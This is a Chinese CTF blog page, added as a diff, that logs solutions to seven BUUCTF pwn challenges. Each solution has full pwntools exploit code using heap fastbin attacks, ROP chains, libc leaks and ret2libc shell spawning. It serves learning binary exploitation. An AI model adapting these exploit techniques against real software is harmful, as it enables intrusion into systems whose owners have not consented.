@@ -1,0 +1,524 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>柠檬的博客</title>
+<meta name="description" content="我是一个热爱信息安全的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。" />
+<link rel="shortcut icon" href="https://zhangzy999.github.io//favicon.ico?v=1595296741197">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://zhangzy999.github.io//styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://zhangzy999.github.io/">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://zhangzy999.github.io//images/avatar.png?v=1595296741197" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">柠檬的博客</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#babyheap_0ctf_2017">babyheap_0ctf_2017</a></li>
+<li><a href="#ciscn_2019_s_3">ciscn_2019_s_3</a></li>
+<li><a href="#jarvisoj_level2_x64">jarvisoj_level2_x64</a></li>
+<li><a href="#harekazectf2019baby_rop2">[HarekazeCTF2019]baby_rop2</a></li>
+<li><a href="#ciscn_2019_ne_5">ciscn_2019_ne_5</a></li>
+<li><a href="#pwn2_sctf_2016">pwn2_sctf_2016</a></li>
+<li><a href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA_2018_rop">铁人三项(第五赛区)_2018_rop</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="https://zhangzy999.github.io/" class="menu" style="animation-delay: 0s">
+          主页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          所有文章
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/post/dalaoboke" class="menu" style="animation-delay: 0.6000000000000001s">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">HELLO WORLD.</div>
+    <a class="rss" href="https://zhangzy999.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">buuctf：pwn刷题记录（二）</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-07-18 / 8 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h2 id="babyheap_0ctf_2017">babyheap_0ctf_2017</h2>
+<p>fastbin attack<br>
+几个点：<br>
+1，read函数返回值为读取到的字节数<br>
+2，calloc分配后会将堆块中的数据全部置空<br>
+3，unsorted bin中的fd和bk（前提只有一个chunk）都会指向unsorted bin ，即arena + 88的位置，是个用来泄露libc地址的不错的选择，libc = unsorted_bin_addr - 88 - main_arena_offset，main_arena_offset用小工具来计算，不同libc版本不一样<br>
+4，got不可写时，我们通常攻击__malloc_hook函数，fake chunk的位置位于__malloc_hook - 0x23的位置，经验之谈：fake_chunk = libc_base + 0x3c4aed，当然也可以慢慢调试计算<br>
+5，在__malloc_hook附近分配chunk时，需要计算其size，0x7f &gt;&gt; 4 - 2 = 5，其mem_size为0x60<br>
+6，fastbin attack 常来攻击__malloc_hook函数</p>
+<p>漏洞位于fill函数中，我们填充数据时的字节由我们来控制，所以造成了任意堆溢出的情景。<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+
+#p = process('./babyheap_0ctf_2017')
+p = remote('node3.buuoj.cn',29704)
+
+elf = ELF('./babyheap_0ctf_2017')
+libc = ELF('./libc.so.6')
+#context.log_level = 'debug'
+
+def allocate(size):
+	p.recvuntil('Command: ')
+	p.sendline('1')
+	p.recvuntil('Size: ')
+	p.sendline(str(size))
+
+def fill(idx,size,content):
+	p.recvuntil('Command: ')
+	p.sendline('2')
+	p.recvuntil('Index: ')
+	p.sendline(str(idx))
+	p.recvuntil('Size: ')
+	p.sendline(str(size))
+	p.recvuntil('Content: ')
+	p.sendline(content)
+
+def free(idx):
+	p.recvuntil('Command: ')
+	p.sendline('3')
+	p.recvuntil('Index: ')
+	p.sendline(str(idx))
+
+def dump(idx):
+	p.recvuntil('Command: ')
+	p.sendline('4')
+	p.recvuntil('Index: ')
+	p.sendline(str(idx))
+	#p.recvuntil('Content:\n')
+
+
+print '==================step 1: leak libc address ================='
+allocate(0x10)  #idx 0
+allocate(0x90)	#idx 1
+allocate(0x90)	#idx 2
+allocate(0x10)	#idx 3
+#calloc 4 chunks,first to overflow ,second to mom ,third to child,last to protect not to hebing
+
+#To 
+free(1)
+payload = 0x10 * 'A' + p64(0) + p64(0x141)
+fill(0,len(payload),payload)
+allocate(0x130)
+
+payload = 0x90 * 'A' + p64(0) + p64(0xa1)
+fill(1,len(payload),payload)
+free(2)
+
+dump(1)   #dump mom to leak child fd_pointer
+p.recvuntil('Content: \n')
+p.recv(0x90 + 0x10)
+unsort_addr = u64(p.recv(0x8))
+print 'unsort_addr---------------&gt;:' + hex(unsort_addr)
+main_arena_offset = 0x3c4b20
+# 3c4b78
+libc_base = unsort_addr - 88 - main_arena_offset
+#we use a tool to caculate main_arena_offset addr
+print 'libc_addr-----------------&gt;:' + hex(libc_base)
+
+print '==========================step 2: one_gadget to get shell ===================='
+one_gadget_addr = libc_base + 0x4526a
+malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
+allocate(0x90)  #clean idx 2
+allocate(0x10)  #idx 4
+allocate(0x60)  #fastbin attack: idx 5
+allocate(0x10)  #to protect not to hebing: idx 6
+
+free(5)
+payload = 0x10 * 'A' + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23)
+# fake_chunk_addr = libc_base + 0x3c4aed
+fill(4,len(payload),payload)
+
+allocate(0x60)  #idx 5
+allocate(0x60)  #idx 7
+payload = 0x13 * 'A' + p64(one_gadget_addr) 
+fill(7,len(payload),payload)
+
+allocate(0x10)
+p.interactive()
+</code></pre>
+<h2 id="ciscn_2019_s_3">ciscn_2019_s_3</h2>
+<p>好像有重题，找了一下现有的exp，还真能打通=.=<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+ 
+#p = process('./ciscn_s_3')
+p = remote('node3.buuoj.cn',29654)
+elf = ELF('./ciscn_s_3')
+context.log_level = 'debug'
+ 
+main_addr = elf.symbols['main']
+csu_end = 0x040059A
+csu_front = 0x0400580
+ret_addr = 0x004003a9
+rax_59_ret = 0x04004E2
+syscall = 0x0400517
+
+#gdb.attach(p,'b *0x00400589')
+payload = '/bin/sh\x00' + 'A'*0x8 + p64(main_addr)
+p.sendline(payload)
+p.recv(0x20)
+stack_addr = u64(p.recv(8))
+print 'stack_addr--&gt;' + hex(stack_addr)
+
+binsh_addr = stack_addr - 0x138
+rax_59 = binsh_addr + 0x10
+pop_rdi = 0x04005a3
+
+payload = '/bin/sh\x00' + 'A'*0x8 + p64(rax_59_ret) + p64(csu_end)
+payload += p64(0) + p64(1) + p64(rax_59) + p64(0) + p64(0) + p64(0)
+payload += p64(csu_front)
+payload += 'a'*0x38
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(syscall)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="jarvisoj_level2_x64">jarvisoj_level2_x64</h2>
+<p>简单的rop<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+
+r = remote('node3.buuoj.cn',26800)
+context.log_level = 'debug'
+
+system_addr = 0x4004C0
+offset = 0x88
+pop_rdi_ret_addr = 0x4006b3
+binsh_addr = 0x600A90
+payload = offset * 'a'  + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="harekazectf2019baby_rop2">[HarekazeCTF2019]baby_rop2</h2>
+<p>栈溢出，rop没跑了，除了printf无输出函数，只能用printf来做，泄露read地址和__libc_start_main的地址都可，试试__libc_start_main吧<br>
+get到了几个新姿势：<br>
+1，__libc_start_main前面是俩下划线<br>
+2，printf(&quot;aaaaaa %s&quot;,char);  中，%s会被放到rdi，char会被放到rsi<br>
+3，printf经过构造也能用来泄露__libc_start_main的got地址（一般是write或者puts）<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+r = remote('node3.buuoj.cn',25712)
+elf = ELF('./babyrop2')
+#context.log_level = 'debug'
+
+printf_plt = elf.plt['printf']
+main = elf.symbols['main']
+libc_start_main_got = elf.got['__libc_start_main']
+offset = 0x28
+fmt_str = 0x400770 #func printf: %s is in rdi,string is in rsi
+pop_rdi_ret_addr = 0x400733
+pop_rsi_r15_ret_addr = 0x400731
+
+payload = offset * 'A' + p64(pop_rdi_ret_addr) + p64(fmt_str) + p64(pop_rsi_r15_ret_addr) + p64(libc_start_main_got) + p64(0) + p64(printf_plt) + p64(main)
+
+r.recvuntil('What\'s your name? ')
+r.sendline(payload)
+__libc_start_main_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+print '__libc_start_main==========================&gt;' + hex(__libc_start_main_addr)
+
+libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)
+libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+payload = offset * 'A' + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="ciscn_2019_ne_5">ciscn_2019_ne_5</h2>
+<p>输入密码进入菜单选项，乍以为是堆题，实际是栈溢出<br>
+新姿势get：system('sh')一样可以拿shell<br>
+ROPgadget --binary xxx --string 'sh' 可以找到字符串'sh'，然后就没有然后了<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+
+r = remote('node3.buuoj.cn',25224)
+elf = ELF('./ciscn_2019_ne_5')
+
+binsh_addr = 0x080482ea
+offset = 0x48 + 0x4
+system_addr = 0x080484D0
+payload = offset * 'A' + p32(system_addr) * 2 + p32(binsh_addr)
+
+r.recvuntil('Please input admin password:')
+r.sendline('administrator')
+r.recvuntil(':')
+r.sendline('1')
+r.recvuntil('Please input new log info:')
+r.sendline(payload)
+r.recvuntil(':')
+r.sendline('4')
+
+r.interactive()
+</code></pre>
+<h2 id="pwn2_sctf_2016">pwn2_sctf_2016</h2>
+<p>一开始泄露__libc_start_main，死活出不来<br>
+看了wp，改成了泄露printf，一下就出来了<br>
+我还能说什么，环境太坑了？？？<br>
+漏洞：没有检测size是否小于0，get_n函数的第一个参数作为无符号整数传入，但是在main函数却是整数，可以传入-1进行溢出，在get_n函数里面是个很大的数，在main函数里却是-1，得以绕过长度限制，进行栈溢出<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import LibcSearcher
+
+r = remote('node3.buuoj.cn',26971)
+elf = ELF('./pwn2_sctf_2016')
+
+fmt_str = 0x080486F8
+printf_plt = elf.plt['printf']
+printf_got = elf.got['printf']
+main_addr = elf.symbols['main']
+offset = 0x2c + 0x4
+
+payload = offset * 'A' + p32(printf_plt) + p32(main_addr) + p32(fmt_str)  +  p32(printf_got)
+
+r.recvuntil('How many bytes do you want me to read? ')
+r.sendline('-1')
+r.recvuntil('data!\n')
+r.sendline(payload)
+
+r.recvuntil('You said: ')
+r.recvuntil('You said: ')
+printf_addr = u32(r.recv(4))
+
+print 'printf_addr ===============================&gt; ' + hex(printf_addr)
+
+libc = LibcSearcher('printf',printf_addr)
+libc_base = printf_addr - libc.dump('printf')
+print 'libc_base ===============================&gt; ' + hex(libc_base)
+
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+print hex(system_addr)
+
+payload = offset * 'A' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
+
+r.recvuntil('How many bytes do you want me to read? ')
+r.sendline('-1')
+r.recvuntil('data!\n')
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<h2 id="铁人三项第五赛区_2018_rop">铁人三项(第五赛区)_2018_rop</h2>
+<p>妹啥好说的，32位rop，用write函数泄露write地址，算算偏移直接拿flag<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import LibcSearcher
+
+r = remote('node3.buuoj.cn',27250)
+elf = ELF('./2018_rop')
+#context.log_level = 'debug'
+
+offset = 0x88 + 0x4
+main_addr = elf.symbols['main']
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+
+payload = offset * 'A' + p32(write_plt) + p32(main_addr)  + p32(1) + p32(write_got) + p32(0x4)
+r.sendline(payload)
+
+write_addr = u32(r.recv(4))
+print 'write_addr =====================&gt; ' + hex(write_addr)
+
+libc = LibcSearcher('write',write_addr)
+libc_base = write_addr - libc.dump('write')
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+payload = offset * 'A' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/">
+                <h3 class="post-title">
+                  fastbin attack(house of sprit) - 2014 hack.lu oreo
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://zhangzy999.github.io//media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
